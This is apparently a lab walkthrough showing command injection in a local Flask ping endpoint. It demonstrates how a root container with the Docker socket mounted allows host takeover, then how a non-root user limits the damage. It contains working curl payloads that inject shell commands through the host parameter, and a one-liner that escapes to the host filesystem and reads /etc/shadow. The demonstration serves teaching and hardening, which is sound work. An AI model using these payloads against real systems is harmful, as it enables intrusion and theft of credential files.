Attack: root RCE → full host takeover
``````````````````````````````````````
$ sudo docker build -t sbi-core-api:vuln .
$ sudo docker run -d -p 5000:5000 --name core-api -v /var/run/docker.sock:/var/run/docker.sock sbi-core-api:vuln

The "attacker" is just a curl request — no shell access needed yet:
``````
curl "http://localhost:5000/ping?host=8.8.8.8;id"
# uid=0(root) gid=0(root) — instant root, no privilege escalation required


Escalate straight to host root through the socket, in one line:
```````````````````````````````````````````````````````````````
curl "http://localhost:5000/ping?host=8.8.8.8;docker%20-H%20unix:///var/run/docker.sock%20run%20-v%20/:/hostfs%20--rm%20alpine%20chroot%20/hostfs%20cat%20/etc/shadow"


Defend: same bug, same exploit, different UID:
````````````````````````````````````````````````
add two lines:

FROM python:3.11-slim
RUN pip install flask && apt update && apt install -y docker.io curl iputils-ping && rm -rf /var/lib/apt/lists/*
COPY app.py /app.py
RUN groupadd -r appuser && useradd -r -g appuser -u 1000 appuser && chown appuser:appuser /app.py
USER appuser
CMD ["python", "/app.py"]




$ sudo docker build -t sbi-core-api:hardened .
$ sudo docker run -d -p 5001:5000 --name core-api-safe -v /var/run/docker.sock:/var/run/docker.sock sbi-core-api:hardened

Run the identical exploit:
````````````````````````````
$ curl "http://localhost:5001/ping?host=8.8.8.8;id"
# uid=1000(appuser) gid=1000(appuser) — the injection still works!

$ curl "http://localhost:5001/ping?host=8.8.8.8;docker%20-H%20unix:///var/run/docker.sock%20run%20alpine%20id"
# permission denied — appuser can't touch the socket







